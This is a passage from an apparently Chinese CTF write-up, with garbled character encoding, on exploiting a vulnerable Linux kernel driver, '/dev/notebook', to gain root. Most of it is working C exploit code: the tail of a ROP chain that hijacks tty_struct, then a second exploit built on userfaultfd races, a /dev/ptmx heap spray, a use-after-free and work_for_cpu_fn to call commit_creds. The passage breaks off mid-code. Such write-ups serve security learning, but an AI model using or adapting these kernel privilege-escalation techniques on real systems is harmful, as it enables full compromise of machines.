SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span> + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = (<span class="hljs-keyword">size_t</span>) &amp;getRootShell;<br>    rop[rop_idx++] = user_cs;<br>    rop[rop_idx++] = user_rflags;<br>    rop[rop_idx++] = user_sp;<br>    rop[rop_idx++] = user_ss;<br><br>    write(note_fd, rop, fake_stack_idx);                    <span class="hljs-comment">// copy the ropchain</span><br>    write(note_fd, fake_tty_ops_data, fake_tty_ops_idx);    <span class="hljs-comment">// hijack the tty_operations</span><br>    write(note_fd, fake_tty_data, tty_idx);                 <span class="hljs-comment">// hijack the tty_struct</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] TTY DATA hijack done.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// exploit</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        write(tty_fd[i], page, <span class="hljs-number">233</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿è¡Œå³å¯æˆåŠŸææƒåˆ° root</p><p><a href="https://i.loli.net/2021/09/10/YOaE1mUfiHuRQKF.png"><img src="https://s2.loli.net/2023/02/06/of3ILh8OD16lzaV.png" alt="image.png"></a></p><blockquote><p>ç»ç¬”è€…å¤šæ¬¡æµ‹è¯•ï¼Œåœ¨å¼€å¤´çš„å‡ æ­¥æ“ä½œç»“æŸåéƒ½ sleep(1) ä¼š<strong>æå¤§åœ°æé«˜åˆ©ç”¨çš„ç¨³å®šæ€§</strong>ï¼ˆä¸»è¦æ˜¯ç­‰å¾…å¤šä¸ªçº¿ç¨‹å¯åŠ¨å®Œæˆï¼‰ï¼Œä¸è¿‡ç”±äºèµ„æºé™åˆ¶æ‰€èƒ½å–·çš„ tty_struct å°±å°‘äº†äº›ï¼ˆä½†ä¹Ÿå¤Ÿç”¨äº†ï¼‰</p></blockquote><h3 id="è§£æ³•äºŒï¼šuserfaultfd-heap-spray-kernel-UAF"><a href="#è§£æ³•äºŒï¼šuserfaultfd-heap-spray-kernel-UAF" class="headerlink" title="è§£æ³•äºŒï¼šuserfaultfd + heap spray + kernel UAF"></a>è§£æ³•äºŒï¼šuserfaultfd + heap spray + kernel UAF</h3><blockquote><p>å‚è€ƒäº†<a href="https://zhuanlan.zhihu.com/p/385645268">é•¿äº­çš„WP</a></p></blockquote><p>å‰åŠéƒ¨åˆ†ä¸è§£æ³•ä¸€åŸºæœ¬ä¸Šç›¸åŒï¼Œä½†æ˜¯åœ¨åŠ«æŒ tty_struct åå¹¶ä¸æ˜¯é€šè¿‡å¤æ‚çš„å¤šæ¬¡æ ˆè¿ç§»è¿›è¡Œåˆ©ç”¨ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ªæ›´ä¸ºç¨³å®šçš„å‡½æ•°â€”â€”</p><h4 id="work-for-cpu-fn-ç¨³å®šåŒ–åˆ©ç”¨"><a href="#work-for-cpu-fn-ç¨³å®šåŒ–åˆ©ç”¨" class="headerlink" title="work_for_cpu_fn ç¨³å®šåŒ–åˆ©ç”¨"></a>work_for_cpu_fn ç¨³å®šåŒ–åˆ©ç”¨</h4><p>åœ¨å¼€å¯äº†å¤šæ ¸æ”¯æŒçš„å†…æ ¸ä¸­éƒ½æœ‰è¿™ä¸ªå‡½æ•°ï¼Œå®šä¹‰äº <code>kernel/workqueue.c</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_for_cpu</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">work</span>;</span><br>    <span class="hljs-keyword">long</span> (*fn)(<span class="hljs-keyword">void</span> *);<br>    <span class="hljs-keyword">void</span> *arg;<br>    <span class="hljs-keyword">long</span> ret;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">work_for_cpu_fn</span><span class="hljs-params">(struct work_struct *work)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_for_cpu</span> *<span class="hljs-title">wfc</span> =</span> container_of(work, struct work_for_cpu, work);<br><br>    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç®€å•åˆ†æå¯çŸ¥è¯¥å‡½æ•°å¯ä»¥ç†è§£ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">work_for_cpu_fn</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    args[<span class="hljs-number">6</span>] = ((<span class="hljs-keyword">size_t</span> (*) (<span class="hljs-keyword">size_t</span>)) (args[<span class="hljs-number">4</span>](args[<span class="hljs-number">5</span>]));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å³ <code>rdi + 0x20</code> å¤„ä½œä¸ºå‡½æ•°æŒ‡é’ˆæ‰§è¡Œï¼Œå‚æ•°ä¸º <code>rdi + 0x28</code> å¤„å€¼ï¼Œè¿”å›å€¼å­˜æ”¾åœ¨ <code>rdi + 0x30</code> å¤„ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥<strong>å¾ˆæ–¹ä¾¿åœ°åˆ†æ¬¡æ‰§è¡Œ prepare_kernel_cred å’Œ commit_credsï¼Œä¸”ä¸ç”¨è€ƒè™‘ KPTI ç»•è¿‡ï¼Œç›´æ¥è¿”å›ç”¨æˆ·æ€ä¾¿èƒ½å®Œæˆç¨³å®šåŒ–ææƒ</strong></p><p>ä¸ä¹‹å‰ä¸åŒçš„æ˜¯åœ¨è¿™é‡Œé€‰æ‹©åŠ«æŒ tty_operations ä¸­çš„ ioctl è€Œä¸æ˜¯ writeï¼Œå› ä¸º tty_struct[4] å¤„æˆå‘˜ <code>ldisc_sem</code> ä¸ºä¿¡å·é‡ï¼Œåœ¨æ‰§è¡Œåˆ° work_for_cpu_fn ä¹‹å‰<strong>è¯¥å€¼ä¼šè¢«æ›´æ”¹</strong></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ tty_operations ä¸­çš„ ioctl å¹¶ä¸æ˜¯ç›´æ¥æ‰§è¡Œçš„ï¼Œæ­¤å‰éœ€è¦ç»è¿‡å¤šé“æ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬åº”å½“ä¼ å…¥æ°å½“çš„å‚æ•°</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORK_FOR_CPU_FN 0xffffffff8109eb90</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> page_size;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">sem_t</span> sem_add, sem_edit;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> * buf; <span class="hljs-comment">// for userfaultfd</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        sleep(<span class="hljs-number">100</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">long</span> note_fd;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> idx;<br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125; Note;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteAdd</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteAddWrapper</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    noteAdd(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteDel</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteEdit</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteEditWrapper</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    noteEdit(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteGift</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">evilAdd</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    sem_wait(&amp;sem_add);<br>    noteAdd((<span class="hljs-keyword">int</span>)args, <span class="hljs-number">0x50</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">evilEdit</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    sem_wait(&amp;sem_edit);<br>    noteEdit((<span class="hljs-keyword">int</span>)args, <span class="hljs-number">0x2000</span>, buf);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">void</span> * buf;<br>    <span class="hljs-keyword">size_t</span> size;<br>&#125; notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> tty_fd[<span class="hljs-number">0x100</span>], tty_idx, fake_tty_ops_idx = <span class="hljs-number">-1</span>, hit_tty = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-keyword">pthread_t</span> <span class="hljs-keyword">tmp_t</span>, <span class="hljs-keyword">add_t</span>, <span class="hljs-keyword">edit_t</span>;<br>    Note note;<br><br>    saveStatus();<br>    sem_init(&amp;sem_add, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    note_fd = open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">strcpy</span>(page, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">// register userfaultfd</span><br>    registerUserFaultFd(buf, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    <span class="hljs-comment">// initialize the notebook</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        noteAdd(i, <span class="hljs-number">0x20</span>, page);<br>        noteEdit(i, TTY_STRUCT_SIZE, page);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Notebook initialization done.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// get all the note free and get the threads stuck by userfaultfd to save their ptrs</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        pthread_create(&amp;<span class="hljs-keyword">edit_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-keyword">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Edit threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// heap spraying to hit the tty_struct</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        tty_fd[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// change the size stored in notebook to pass _check_object_size and get the threads stuck by userfaultfd to save the ptrs</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        pthread_create(&amp;<span class="hljs-keyword">add_t</span>, <span class="hljs-literal">NULL</span>, evilAdd, (<span class="hljs-keyword">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Add threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// check whether we&#x27;ve hit the tty_struct</span><br>    noteGift((<span class="hljs-keyword">char</span>*) notebook);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span 